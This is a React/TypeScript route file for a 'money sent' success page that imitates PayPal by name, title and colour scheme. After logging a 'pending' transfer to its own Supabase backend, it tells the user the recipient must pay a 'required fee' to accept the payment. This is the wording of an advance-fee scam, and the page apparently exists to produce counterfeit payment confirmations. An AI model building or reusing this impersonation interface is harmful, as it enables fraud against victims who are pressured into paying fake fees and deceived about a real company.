import { createFileRoute, Link, useNavigate, useSearch } from "@tanstack/react-router";
import { Check } from "lucide-react";
import { useEffect, useRef } from "react";
import { RequireAuth } from "@/auth/RequireAuth";
import { supabase } from "@/integrations/supabase/client";

type Search = { to: string; amount: string };

export const Route = createFileRoute("/send/success")({
  validateSearch: (s: Record<string, unknown>): Search => ({
    to: typeof s.to === "string" ? s.to : "",
    amount: typeof s.amount === "string" ? s.amount : "0",
  }),
  component: SuccessRoute,
  head: () => ({
    meta: [{ title: "Money sent — PayPal" }],
  }),
});

function fmtUSD(n: number) {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(n);
}

function SuccessRoute() {
  return (
    <RequireAuth>
      <SuccessPage />
    </RequireAuth>
  );
}

function SuccessPage() {
  const navigate = useNavigate();
  const { to, amount } = useSearch({ from: "/send/success" });
  const n = Number.parseFloat(amount) || 0;
  const recorded = useRef(false);

  useEffect(() => {
    if (recorded.current || !to || n <= 0) return;
    recorded.current = true;
    const key = `send:${to}:${amount}:${Math.floor(Date.now() / 60000)}`;
    if (sessionStorage.getItem(key)) return;
    sessionStorage.setItem(key, "1");
    supabase.rpc("send_money", { p_amount: n, p_to: to, p_status: "pending" }).then(() => {});
  }, [to, amount, n]);


  return (
    <div className="min-h-screen flex flex-col bg-white px-6 pt-16 pb-10">
      <div className="mx-auto h-16 w-16 rounded-full bg-[var(--pp-yellow)] flex items-center justify-center">
        <Check size={32} strokeWidth={3} className="text-[var(--pp-blue-dark)]" />
      </div>
      <h1 className="mt-6 text-[26px] font-bold text-center leading-tight text-[var(--pp-text)] break-words">
        You sent {fmtUSD(n)} to {to}
      </h1>
      <p className="mt-4 text-center text-[14px] text-[var(--pp-text-muted)] leading-relaxed">
        Your payment is being reviewed and is currently pending. We’re waiting for the recipient to pay the required fee to accept the payment. If the payment is not accepted within 5 days the funds will be returned to your account.
      </p>

      <div className="flex-1" />

      <button
        type="button"
        onClick={() => navigate({ to: "/" })}
        className="w-full rounded-full bg-[var(--pp-yellow)] py-4 text-[17px] font-bold text-[var(--pp-text)]"
      >
        Done
      </button>
      <Link
        to="/send"
        className="mt-5 text-center text-[15px] font-bold text-[var(--pp-blue)]"
      >
        Send again
      </Link>
    </div>
  );
}
